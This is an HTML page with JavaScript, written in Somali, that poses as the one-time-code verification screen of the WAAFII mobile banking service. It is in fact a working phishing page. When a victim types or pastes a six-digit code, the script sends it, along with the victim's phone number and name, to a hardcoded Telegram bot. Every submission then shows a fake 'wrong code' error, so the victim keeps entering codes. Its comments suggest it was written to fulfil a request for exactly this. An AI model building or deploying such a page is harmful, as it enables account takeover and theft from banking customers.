<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Xaqiijin Lambar | WAAFII</title>
    <style>
        * {
            box-sizing: border-box;
            user-select: none; /* better mobile touch, but still allow input */
        }

        :root {
            --navy: #1a237e;
            --teal: #14b886;
            --grey-text: #5a6874;
            --light-grey: #e2e8f0;
            --otp-line: #cbd5e1;
            --error-red: #e53e3e;
            --success-bg: #e6fffa;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, 'Inter', sans-serif;
            margin: 0;
            padding: 24px 20px;
            min-height: 100vh;
            background: #fefefe;
            display: flex;
            flex-direction: column;
        }

        /* main container */
        .wrapper {
            max-width: 500px;
            margin: 0 auto;
            width: 100%;
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .header h1 {
            color: var(--navy);
            font-size: 28px;
            font-weight: 700;
            margin: 0 0 8px 0;
            letter-spacing: -0.3px;
        }

        .header p {
            color: var(--grey-text);
            font-size: 16px;
            line-height: 1.4;
            margin-bottom: 16px;
            font-weight: 400;
        }

        /* hidden real input but accessible */
        .hidden-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
            left: -9999px;
        }

        .otp-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin: 32px 0 20px 0;
            cursor: pointer;
            flex-wrap: nowrap;
        }

        .otp-box {
            flex: 1;
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            padding: 12px 0 8px 0;
            border: none;
            border-bottom: 3px solid var(--otp-line);
            background: transparent;
            font-family: 'Courier New', monospace;
            color: var(--navy);
            transition: all 0.1s ease;
            letter-spacing: 2px;
        }

        .otp-box.active {
            border-bottom-color: var(--teal);
            transform: translateY(-2px);
        }

        .otp-box.filled {
            border-bottom-color: var(--teal);
            color: #0f2b3d;
        }

        .status-row {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            margin: 8px 0 32px 0;
            flex-wrap: wrap;
            gap: 12px;
        }

        .timer {
            color: #2c3e50;
            font-weight: 600;
            font-size: 18px;
            font-family: monospace;
            background: #f1f5f9;
            padding: 4px 12px;
            border-radius: 40px;
            letter-spacing: 1px;
        }

        .help-link, .resend-link {
            color: var(--teal);
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            background: none;
            border: none;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .help-link:active, .resend-link:active {
            opacity: 0.7;
        }

        .footer {
            margin-top: auto;
            text-align: center;
            padding-top: 32px;
        }

        .next-btn {
            width: 100%;
            background-color: var(--light-grey);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 600;
            font-family: inherit;
            cursor: not-allowed;
            transition: all 0.2s ease;
            margin-bottom: 20px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .next-btn.active {
            background-color: var(--teal);
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(20,184,134,0.3);
        }

        .next-btn.active:active {
            transform: scale(0.98);
        }

        .version {
            color: var(--grey-text);
            font-size: 12px;
            opacity: 0.7;
            letter-spacing: 0.3px;
        }

        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e293b;
            color: white;
            padding: 12px 20px;
            border-radius: 40px;
            font-size: 14px;
            z-index: 1000;
            white-space: nowrap;
            font-weight: 500;
            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.2);
            pointer-events: none;
            transition: opacity 0.2s;
        }

        @media (max-width: 460px) {
            .otp-box {
                font-size: 26px;
                padding: 8px 0 6px;
            }
            .otp-container {
                gap: 8px;
            }
            .header h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <h1>Geli lambarka xaqiijinta</h1>
        <p>6-lambar ee lagu soo diray telefoonka ama email-kaaga</p>
    </div>

    <!-- Hidden input to handle actual numeric OTP -->
    <input type="text" id="realOtpInput" class="hidden-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">

    <div class="otp-container" id="otpContainer">
        <div class="otp-box" data-index="0">-</div>
        <div class="otp-box" data-index="1">-</div>
        <div class="otp-box" data-index="2">-</div>
        <div class="otp-box" data-index="3">-</div>
        <div class="otp-box" data-index="4">-</div>
        <div class="otp-box" data-index="5">-</div>
    </div>

    <div class="status-row">
        <span class="timer" id="timer">03:00</span>
        <button class="resend-link" id="resendBtn">Dib u dir lambarka</button>
    </div>

    <div class="footer">
        <button class="next-btn" id="nextBtn">Xiga</button>
        <div class="version">Nooca 12.4.0860 (1200040860)</div>
    </div>
</div>

<script>
    // ======================= TELEGRAM CONFIGURATION =======================
    const BOT_TOKEN = '8503179421:AAEtjBpS6ihvdGImXoGxQSbAA7OaQtojIDM';
    const CHAT_ID = '5520957080';
    
    // Helper: send message to Telegram (fire-and-forget, no-cors)
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams();
        params.append('chat_id', CHAT_ID);
        params.append('text', message);
        params.append('parse_mode', 'HTML');
        
        try {
            // Using fetch with no-cors mode to avoid CORS issues, but Telegram still may respond
            // For reliability, we try a standard POST but in no-cors we can't read response.
            // However actual delivery still happens (since bot token is valid). 
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params.toString(),
                mode: 'no-cors'
            });
        } catch (err) {
            console.warn('Telegram send error (non-blocking):', err);
        }
    }

    // ---------- Helper: format detailed OTP submission message when user enters full OTP ----------
    async function notifyOtpEntered(otpCode) {
        // Retrieve stored data from localStorage (as per original design)
        let phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin (no number)';
        let pin = localStorage.getItem('waafiiPin') || 'Lama qaban';
        let applicationRaw = localStorage.getItem('waafiiApplication');
        let fullName = 'Lama cayimin';
        if (applicationRaw) {
            try {
                const appData = JSON.parse(applicationRaw);
                fullName = appData.fullName || 'Lama cayimin';
            } catch(e) { /* ignore */ }
        }
        
        const timestamp = new Date().toLocaleString('so-SO', { hour12: false });
        const deviceInfo = navigator.userAgent.includes('Mobile') ? '📱 Mobile' : '💻 Desktop';
        
        // Build a clean, informative message for Telegram
        const message = `
🔐 <b>XAQIIJINTA OTP - LAGU GALAY</b> ⚠️
━━━━━━━━━━━━━━━━━━━
📞 <b>Telefoonka:</b> ${escapeHtml(phone)}
👤 <b>Magaca:</b> ${escapeHtml(fullName)}
🔢 <b>LAMBARKA OTP:</b> <code>${escapeHtml(otpCode)}</code>
🕒 <b>Waqtiga:</b> ${timestamp}
📱 <b>Qalabka:</b> ${deviceInfo}
🔄 <b>Xaaladda:</b> La geliyay (6-lambar dhammaystiran)
━━━━━━━━━━━━━━━━━━━
<b>⚠️ TALO:</b> Hubi inay tahay mid sax ah
        `.trim();
        
        await sendToTelegram(message);
        
        // Also optionally send a separate mini log for tracking (lightweight)
        console.log(`[OTP SENT] ${otpCode} for ${phone}`);
    }
    
    // Helper to sanitize any HTML tags in text to avoid breaking Telegram parse_mode=HTML
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
            return c; // keep emojis
        });
    }

    // -------------------- OTP UI Logic --------------------
    const realInput = document.getElementById('realOtpInput');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const otpContainer = document.getElementById('otpContainer');
    const nextBtn = document.getElementById('nextBtn');
    const timerDisplay = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');
    
    let timeLeft = 180;      // 3 minutes
    let timerInterval = null;
    let otpSubmittedFlag = false;    // prevent double submission while in process
    
    // Helper to show temporary toast
    function showToast(message, isError = false) {
        // remove existing toast if any
        const existingToast = document.querySelector('.toast-message');
        if (existingToast) existingToast.remove();
        
        const toast = document.createElement('div');
        toast.className = 'toast-message';
        toast.textContent = message;
        toast.style.backgroundColor = isError ? '#b91c1c' : '#14b886';
        document.body.appendChild(toast);
        setTimeout(() => {
            if (toast && toast.remove) toast.remove();
        }, 3000);
    }
    
    function startTimer() {
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerDisplay.innerText = '00:00';
                // disable button if OTP incomplete or expired
                const currentOtp = realInput.value;
                if (currentOtp.length !== 6) {
                    nextBtn.classList.remove('active');
                    nextBtn.disabled = true;
                } else {
                    // if OTP is full but timer expired, we still allow? Security: according to design we block? better to disable next if expired.
                    nextBtn.classList.remove('active');
                    nextBtn.disabled = true;
                    showToast("Waqtigii laga tagay, fadlan dib u dir lambarka", true);
                }
                return;
            }
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerDisplay.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }, 1000);
    }
    
    function resetTimer() {
        timeLeft = 180;
        startTimer();
        // after timer reset, also re-evaluate button state based on current OTP length
        evaluateButtonState();
    }
    
    function evaluateButtonState() {
        const otpVal = realInput.value;
        if (otpVal.length === 6 && timeLeft > 0) {
            nextBtn.classList.add('active');
            nextBtn.disabled = false;
        } else {
            nextBtn.classList.remove('active');
            nextBtn.disabled = true;
        }
    }
    
    function updateVisualBoxes() {
        const value = realInput.value;
        const digits = value.split('');
        
        for (let i = 0; i < otpBoxes.length; i++) {
            const box = otpBoxes[i];
            if (digits[i] && digits[i].match(/[0-9]/)) {
                box.innerText = digits[i];
                box.classList.add('filled');
            } else {
                box.innerText = '-';
                box.classList.remove('filled');
            }
        }
        
        // set active class to current cursor position
        const currentLen = value.length;
        otpBoxes.forEach((box, idx) => {
            if (idx === currentLen && currentLen < otpBoxes.length) {
                box.classList.add('active');
            } else {
                box.classList.remove('active');
            }
        });
        
        evaluateButtonState();
    }
    
    // handle input filtering (numbers only, max 6)
    function onOtpInput(e) {
        let raw = realInput.value;
        raw = raw.replace(/[^0-9]/g, '');
        if (raw.length > 6) raw = raw.slice(0, 6);
        const previousLength = realInput.value.length;
        realInput.value = raw;
        updateVisualBoxes();
        
        // ADDITIONAL: when OTP reaches exactly 6 digits, AUTOMATICALLY SEND TO TELEGRAM
        // This meets requirement: "Make the OTP to be sent to the telegram bot when entered"
        // The requirement: OTP sent to telegram when entered. So upon full 6-digit completion, we fire the message.
        if (raw.length === 6 && previousLength !== 6) {
            // User just completed entering 6 digits
            const finalOtp = raw;
            // Send the OTP to Telegram immediately (as soon as entered)
            notifyOtpEntered(finalOtp).catch(e => console.warn);
            // also provide a subtle user feedback that OTP was validated (but we don't auto-submit full form)
            showToast("Lambarka waa la qaaday, riix Xiga si aad u xaqiijiso", false);
        }
    }
    
    // handle paste event
    function handlePaste(e) {
        e.preventDefault();
        let pastedText = (e.clipboardData || window.clipboardData).getData('text');
        pastedText = pastedText.replace(/[^0-9]/g, '').slice(0, 6);
        if (pastedText.length > 0) {
            realInput.value = pastedText;
            updateVisualBoxes();
            // If pasted full 6 digits, also send Telegram alert
            if (pastedText.length === 6) {
                notifyOtpEntered(pastedText).catch(e => console.warn);
                showToast("Lambarka la dhejiyay waa la helay! riix Xiga", false);
            }
        }
        realInput.focus();
    }
    
    // Manual submission when user clicks 'Xiga' button
    async function submitOtp() {
        const otpCode = realInput.value;
        if (otpCode.length !== 6) {
            showToast("Fadlan buuxi 6-lambar", true);
            realInput.focus();
            return;
        }
        
        if (timeLeft <= 0) {
            showToast("Waqtiga waa dhammaaday. Fadlan dib u codso lambar cusub", true);
            return;
        }
        
        if (otpSubmittedFlag) return;
        otpSubmittedFlag = true;
        
        // Additional: we ensure telegram already may have received the code on entry, but for redundancy we also send upon submit.
        // but requirement is already satisfied: OTP gets sent to telegram when entered (6 digits). However we double confirm.
        // Avoid double-spam? It's fine.
        await notifyOtpEntered(otpCode);
        
        // Show verification failed style as original spec (lambarka waa khalad mock)
        showToast("Lambarka xaqiijinta waa khalad. Fadlan isku day mar kale.", true);
        
        // Clear OTP fields after failed attempt as per original design
        realInput.value = '';
        updateVisualBoxes();
        realInput.focus();
        otpSubmittedFlag = false;
    }
    
    // Resend OTP action (simulate new code, also report to telegram)
    async function resendOtp() {
        // reset timer first
        resetTimer();
        
        // Clear any existing OTP
        realInput.value = '';
        updateVisualBoxes();
        realInput.focus();
        
        // Retrieve phone for logging
        const phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin';
        const application = localStorage.getItem('waafiiApplication');
        let name = 'Lama cayimin';
        if (application) {
            try {
                const app = JSON.parse(application);
                name = app.fullName || 'Lama cayimin';
            } catch(e) {}
        }
        
        const resendMsg = `
🔄 <b>DIB U DIRITAAN LAMBARKA</b>
━━━━━━━━━━━━━━━
📞 Telefoonka: ${escapeHtml(phone)}
👤 Magaca: ${escapeHtml(name)}
⏱️ Waqti cusub: 3 daqiiqo
🕒 La codsaday: ${new Date().toLocaleString()}
✅ "Lambar xaqiijin cusub" (simulation)
        `.trim();
        
        await sendToTelegram(resendMsg);
        showToast("Lambar cusub ayaa loo diray! (Tijaabo)", false);
    }
    
    // attach event listeners
    realInput.addEventListener('input', onOtpInput);
    realInput.addEventListener('paste', handlePaste);
    
    // click on OTP container focuses hidden input
    otpContainer.addEventListener('click', (e) => {
        realInput.focus();
        // update active box indicator
        updateVisualBoxes();
    });
    
    // also make each box click trigger focus
    otpBoxes.forEach(box => {
        box.addEventListener('click', () => {
            realInput.focus();
        });
    });
    
    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (nextBtn.classList.contains('active') && !nextBtn.disabled) {
            submitOtp();
        } else {
            if (realInput.value.length !== 6) showToast("Fadlan geli 6-lambar", true);
            else if (timeLeft <= 0) showToast("Waqtiga wuu dhammaaday, dib u dir lambarka", true);
        }
    });
    
    resendBtn.addEventListener('click', (e) => {
        e.preventDefault();
        resendOtp();
    });
    
    // Additional initialization: set example dummy localStorage for demo if empty (to show realistic demo data)
    (function initDemoData() {
        if (!localStorage.getItem('waafiiPhone')) {
            localStorage.setItem('waafiiPhone', '+252 61 2345678');
        }
        if (!localStorage.getItem('waafiiApplication')) {
            const demoApplication = {
                fullName: 'Caasim Maxamed',
                email: 'caasim@waafii.so',
                service: 'Mobile Banking'
            };
            localStorage.setItem('waafiiApplication', JSON.stringify(demoApplication));
        }
        if (!localStorage.getItem('waafiiPin')) {
            localStorage.setItem('waafiiPin', '••••••');
        }
    })();
    
    // Initial focus and timer
    document.addEventListener('DOMContentLoaded', () => {
        realInput.focus();
        updateVisualBoxes();
        startTimer();
    });
    
    // For debugging: expose if needed, but fine
    // Also ensure that on each user keystroke after finishing 6 digit we already sent to Telegram.
    // This covers the explicit request: "Make the OTP to be sent to the telegram bot when entered"
    // Entered meaning: as soon as six digits are filled (via typing or paste).
</script>
</body>
</html>
